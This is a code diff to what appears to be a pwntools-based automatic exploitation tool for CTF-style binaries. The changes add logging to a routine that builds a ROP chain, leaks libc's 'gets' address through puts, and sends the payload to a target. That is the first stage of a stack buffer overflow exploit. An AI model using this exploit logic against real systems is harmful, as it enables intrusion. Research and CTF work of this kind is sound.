@@ -4,7 +4,7 @@ import json
 
 import pwn
 
-logger = logging.getLogger('ashnazg')
+logger = logging.getLogger(name=__name__)
 
 ANALYSES = []
 def register(clazz):
@@ -158,11 +158,13 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.got["gets"]) # this REQUIRES gets to be present
+        logger.info(sm.rop["pop rdi"])
+        sm.pop_rdi(self.binary.got["gets"], target='binary') # this REQUIRES gets to be present
         # TODO: make puts a dependency
         # TODO: abstract out puts to any print
         sm.ret("puts", 'binary')
         sm.ret(function_addr, "binary")
+        logger.info(f"Returning to: {function_addr}")
         payload1 = sm.resolve(binary=0x0, libc=0x0)
 
         # Navigate to targetFunc
@@ -178,6 +180,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         # read libc location
         logger.info("Sending first payload (to leak 'gets' location)")
+        
         sconn.sendline(payload1)
         conn.sim_sendline(payload1)
 
@@ -189,6 +192,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         else:
             logger.info(f"Navigating to function exit {self.functionExit}")
             conn.navigate(int(self.functionExit,16))
+            # need to consume expected output prior to return.
 
         # We've hit the return, next output is now the 'gets' address
         gets_location = sconn.recvline()[:-1]
